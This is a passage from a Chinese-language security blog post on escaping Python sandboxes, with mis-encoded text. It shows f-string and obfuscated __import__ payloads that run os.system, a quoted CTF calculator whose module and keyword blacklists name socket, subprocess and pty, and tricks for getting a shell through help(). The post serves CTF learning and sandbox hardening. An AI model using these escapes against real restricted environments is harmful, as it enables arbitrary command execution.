class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> - <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> + <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br></code></pre></td></tr></table></figure><br />
ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>or</code></p>
<p>æ›¿æ¢ <code>and</code> çš„æµ‹è¯•ä»£ç <br />
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)]:<br>    ans = i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> &amp; <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bool</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i[<span class="hljs-number">0</span>]==i[<span class="hljs-number">1</span>]&#125;</span> * <span class="hljs-subst">&#123;i[<span class="hljs-number">2</span>]==i[<span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)) == ans)<br></code></pre></td></tr></table></figure><br />
ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>and</code></p>
<h3 id="é™åˆ¶">é™åˆ¶ ( )</h3>
<p>è¿™ç§æƒ…å†µä¸‹é€šå¸¸éœ€è¦èƒ½å¤Ÿæ”¯æŒ exec æ‰§è¡Œä»£ç ã€‚å› ä¸ºæœ‰ä¸¤ç§å§¿åŠ¿ï¼š</p>
<ul>
<li>åˆ©ç”¨è£…é¥°å™¨ <code>@</code></li>
<li>åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚ <code>enum.EnumMeta.__getitem__</code>ï¼Œ</li>
</ul>
<p>åˆ©ç”¨è¿™ä¸¤ç§å§¿åŠ¿ï¼Œæˆ‘åœ¨ã€ŠOrangeKiller CTF ç¬¬ 2 æœŸã€‹ä¸­å‡ºäº† 2 é“é¢˜ç›®ï¼Œé¢˜è§£ç¯‡å†™çš„å¾ˆè¯¦ç»†ï¼Œç§»æ­¥å»çœ‹å§ï¼š<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">ä¼ é€é—¨</a></p>
<h3 id="åˆ©ç”¨æ–°ç‰¹æ€§">åˆ©ç”¨æ–°ç‰¹æ€§</h3>
<p>PEP 498 å¼•å…¥äº† <code>f-string</code>ï¼Œåœ¨ 3.6 å¼€å§‹å‡ºç°ï¼š<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">ä¼ é€é—¨ğŸšª</a>ï¼Œé£Ÿç”¨æ–¹å¼ï¼š<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">ä¼ é€é—¨ğŸšª</a>ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ç§èˆ¹æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span><br>macr0phag3<br><span class="hljs-string">&#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><br />
å…³æ³¨æ¯æ¬¡ç‰ˆæœ¬å¢åŠ çš„æ–°ç‰¹æ€§ï¼Œæˆ–è®¸èƒ½æ·˜åˆ°ç‚¹å®è´ã€‚</p>
<h3 id="åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»">åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»</h3>
<p>ååºåˆ—åŒ–æ”»å‡»ä¹Ÿæ˜¯èƒ½ç”¨æ¥é€ƒé€¸ï¼Œä½†æ˜¯å…³äºååºåˆ—åŒ–æ”»å‡»çš„å®‰å…¨é—®é¢˜è¿˜æŒºå¤šçš„ï¼Œæˆ‘ä¸“é—¨å†™äº†ç¯‡æ–‡ç« ï¼Œè§ï¼š<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">ä¼ é€é—¨ğŸšª</a></p>
<h2 id="section">ğŸŒ°</h2>
<p>è¿™ä¸ªä¾‹å­æ¥è‡ª<code>iscc 2016</code>çš„<code>Pwn300 pycalc</code>ï¼Œç›¸å½“æœ‰è¶£ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;   Simple calculator implemented by python   &quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=============================================&quot;</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getexp</span>():<br>    <span class="hljs-keyword">return</span> raw_input(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hook_import_</span>(<span class="hljs-params">name, *args, **kwargs</span>):<br>    module_blacklist = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>,<br>                        <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>,<br>                        <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>                        <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>,<br>                        <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>,<br>                        <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>,<br>                        <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>,<br>                        <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>,<br>                        <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>,<br>                        <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>,<br>                        <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> module_blacklist:<br>        <span class="hljs-keyword">if</span> name == forbid:        <span class="hljs-comment"># don&#x27;t let user import these modules</span><br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="hljs-built_in">format</span>(forbid))<br>    <span class="hljs-comment"># normal modules can be imported</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(name, *args, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;__getitem__&#x27;</span>, <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>                 <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_exec</span>(<span class="hljs-params">command</span>):      <span class="hljs-comment"># sandbox user input</span><br>    result = <span class="hljs-number">0</span><br>    __sandboxed_builtins__ = <span class="hljs-built_in">dict</span>(__builtins__.__dict__)<br>    __sandboxed_builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="hljs-comment"># hook import</span><br>    <span class="hljs-keyword">del</span> __sandboxed_builtins__[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    _<span class="hljs-keyword">global</span> = &#123;<br>        <span class="hljs-string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__<br>    &#125;<br>    <span class="hljs-keyword">if</span> sandbox_filter(command) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Malicious user input detected!!!&#x27;</span><br>        exit(<span class="hljs-number">0</span>)<br>    command = <span class="hljs-string">&#x27;result = &#x27;</span> + command<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span> command <span class="hljs-keyword">in</span> _<span class="hljs-keyword">global</span>     <span class="hljs-comment"># do calculate in a sandboxed environment</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> e<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    result = _<span class="hljs-keyword">global</span>[<span class="hljs-string">&#x27;result&#x27;</span>]  <span class="hljs-comment"># extract the result</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>banner()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    command = getexp()<br>    <span class="hljs-built_in">print</span> sandbox_exec(command)<br></code></pre></td></tr></table></figure></p>
<p><code>exec command in _global</code> è¿™ä¸€å¥å°±æŠŠå¾ˆå¤š payload å¹²æ‰äº†ï¼Œç”±äº exec è¿è¡Œåœ¨è‡ªå®šä¹‰çš„å…¨å±€å‘½åç©ºé—´é‡Œï¼Œè¿™æ—¶å€™ä¼šå¤„äº<code>restricted execution mode</code>ï¼Œè¿™é‡Œä¸èµ˜è¿°äº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">ä¼ é€é—¨ğŸšª</a>ã€‚exec åŠ ä¸Šå®šåˆ¶çš„ globals ä¼šä½¿å¾—æ²™ç®±å®‰å…¨å¾ˆå¤šï¼Œä¸€äº›å¸¸è§„çš„ payload æ˜¯æ²¡æ³•ä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š<br />
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">71</span>]._Printer__setup.__globals__<br>restricted attribute<br>&gt;&gt;&gt; getattr(getattr(__import__(<span class="hljs-string">&#x27;types&#x27;</span>), <span class="hljs-string">&#x27;FileType&#x27;</span>)(<span class="hljs-string">&#x27;key&#x27;</span>), <span class="hljs-string">&#x27;re&#x27;&#x27;ad&#x27;</span>)()<br><span class="hljs-keyword">file</span>() <span class="hljs-function"><span class="hljs-keyword">constructor</span> <span class="hljs-title">not</span> <span class="hljs-title">accessible</span> <span class="hljs-title">in</span> <span class="hljs-title">restricted</span> <span class="hljs-title">mode</span></span><br></code></pre></td></tr></table></figure><br />
ä¸è¿‡ä¹Ÿæ­£æ˜¯ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š<br />
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; getattr(<span class="hljs-name">__import__</span>(&#x27;types&#x27;).__builtins__[&#x27;__tropmi__&#x27;[:<span class="hljs-symbol">:-1</span>]](&#x27;so&#x27;[:<span class="hljs-symbol">:-1</span>]), &#x27;mets&#x27; &#x27;ys&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;whoami&#x27;)<br>macr0phag3<br></code></pre></td></tr></table></figure></p>
<h3 id="æç«¯é™åˆ¶">æç«¯é™åˆ¶</h3>
<p>è¿™ç§é™åˆ¶ä¸€èˆ¬æ˜¯ç»„åˆå½¢å¼å‡ºç°ï¼Œè€Œä¸”é€šå¸¸åªä¼šå‡ºç°åœ¨ CTF ä¸­ã€‚</p>
<blockquote>
<p>é™åˆ¶è¾“å…¥å­—ç¬¦çš„é›†åˆçš„å¤§å°</p>
</blockquote>
<p>æ€è·¯å°±æ˜¯å…ˆç¡®å®šä¸å¾—ä¸ç”¨åˆ°çš„å­—ç¬¦ï¼Œå†çœ‹è¿™äº›å­—ç¬¦èƒ½å¤Ÿæ‹¼å‡ºå“ªäº›å‡½æ•°æˆ–è€…å¸¸é‡ã€‚</p>
<p>æˆ‘åœ¨ã€ŠOrangeKiller CTF ç¬¬ 2 æœŸã€‹ä¸­å‡ºäº† 3 é“é¢˜ç›®ä¸æ­¤ç›¸å…³ï¼Œé¢˜è§£ç¯‡å†™çš„å¾ˆè¯¦ç»†ï¼Œç§»æ­¥å»çœ‹å§ï¼š<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">ä¼ é€é—¨</a></p>
<blockquote>
<p>é™åˆ¶ä¸èƒ½ä½¿ç”¨ <code>[a-zA-Z]</code> çš„å­—ç¬¦</p>
</blockquote>
<p>æˆ‘åœ¨ <a href="https://www.tr0y.wang/2020/08/18/IDN/#åˆ©ç”¨åœºæ™¯">ã€Šä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿã€‹</a> ä¸­æåˆ°è¿‡ï¼ŒPython3 æ”¯æŒäº† Unicode å˜é‡åä¸”è§£é‡Šå™¨åœ¨åšä»£ç è§£æçš„æ—¶å€™ï¼Œä¼šå¯¹å˜é‡åè¿›è¡Œè§„èŒƒåŒ–ï¼Œç®—æ³•æ˜¯ <code>NFKC</code>ã€‚</p>
<p>æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç”¨è¿™ç§å§¿åŠ¿ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span> == áµ‰val<br></code></pre></td></tr></table></figure></p>
<blockquote>
<p>socket + ä¸¥æ ¼çš„è¾“å…¥é™åˆ¶</p>
</blockquote>
<p>å¯ä»¥çœ‹çœ‹æ˜¯å¦æ¼æ‰äº† <code>help</code>ï¼Œæ¼æ‰çš„è¯ï¼Œå…ˆé€šè¿‡ <code>help()</code> è°ƒèµ· vi/vimï¼Œç„¶åç”¨ <code>!</code> æŒ‡ä»¤å³å¯ getshell :)</p>
<blockquote>
<p>é€šè§£</p>
</blockquote>
<p>å·²ç»ä¸“é—¨å†™æ–‡ç« ä»‹ç»äº†ï¼Œè§ï¼š<a href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/">ã€ŠPython æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯ã€‹</a></p>
<h2 id="æœ€å">æœ€å</h2>
<p>è¿™å—å†…å®¹æœ¬èº«å°±é›¶æ•£ï¼Œç½—é‡Œå§å—¦äº†è¿™ä¹ˆå¤šï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰å¸®åŠ©ï¼Œå¦‚æœæœ‰ä¸ä¸¥è°¨çš„åœ°æ–¹å¸Œæœ›å„ä½å¸ˆå‚…ä»¬èƒ½æŒ‡å‡ºæ¥ï¼Œå…±åŒæ¢è®¨ [æŠ±æ‹³]</p>
<br>
<p style="text-align: center;">
<font size="2px" color="gray">æ¥å‘€å¿«æ´»å‘€</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">ç»éªŒæ€»ç»“</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Python/">#Python</a>
      
        <a href="/tags/Web/">#Web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“</div>
      <div>https://www.tr0y.wang/2019/05/06/Pythonæ²™ç®±é€ƒé€¸ç»éªŒæ€»ç»“/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2019å¹´5æœˆ6æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2023å¹´12æœˆ13æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/05/11/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BXPath%E6%B3%A8%E5%85%A5/" title="OWASP Top10 ç³»åˆ—ä¹‹ XPath æ³¨å…¥">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">OWASP Top10 ç³»åˆ—ä¹‹ XPath æ³¨å…¥</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/05/03/XXE%E6%8C%87%E5%8C%97/" title="XXE æŒ‡åŒ—">
                        <span class="hidden-mobile">XXE æŒ‡åŒ—</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
